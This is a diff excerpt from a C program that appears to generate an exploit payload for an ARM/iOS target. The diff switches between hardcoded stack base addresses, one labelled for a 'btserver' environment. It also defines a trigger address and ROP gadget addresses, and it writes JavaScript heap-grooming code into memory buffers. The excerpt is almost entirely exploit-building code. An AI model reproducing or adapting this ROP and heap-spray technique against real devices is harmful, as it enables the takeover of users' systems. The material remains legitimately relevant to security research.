@@ -173,10 +173,10 @@ int main(int   argc,
 	fprintf(fp, "#   - with love from spv <3\n");
 	fprintf(fp, "\n");
 
-//	uint32_t	stack_base					= 0x1c7738; // my shell setup
+	uint32_t	stack_base					= 0x1c7738; // my shell setup
 //	uint32_t	stack_base					= 0x1c7c88; // my 4s shell setup
 //	uint32_t	stack_base					= 0x1c2e48; // my lldb
-	uint32_t	stack_base					= 0x1c7d68; // btserver env
+//	uint32_t	stack_base					= 0x1c7d68; // btserver env
 	uint32_t	magic_trigger_addr			= 0xb6074;
 
 	uint32_t	mov_r0_0_bx_lr				= 0x8d3e	| 1;
@@ -365,18 +365,22 @@ int main(int   argc,
 				writebuf_unslid(0x108000,
 								"var parent = new Uint8Array(0x100);"
 								"var child = new Uint8Array(0x100);"
-								""
-								"function shitalloc() {"
 								"    var fuck = new Array();"
 								"    for (var i = 0; i < 0x800000; i++) {"
 								"        fuck[i] = i;"
 								"    }"
 								"    delete fuck;"
-								"}"
 								""
-								"shitalloc();",
+								"//shitalloc();",
 								strlen("var parent = new Uint8Array(0x100);"
-									   "var child = new Uint8Array(0x100);") + 1));
+									   "var child = new Uint8Array(0x100);"
+									   "    var fuck = new Array();"
+									   "    for (var i = 0; i < 0x800000; i++) {"
+									   "        fuck[i] = i;"
+									   "    }"
+									   "    delete fuck;"
+									   ""
+									   "//shitalloc();") + 1));
 		fprintf(fp,
 				"%s",
 				writebuf_unslid(0x10a000,
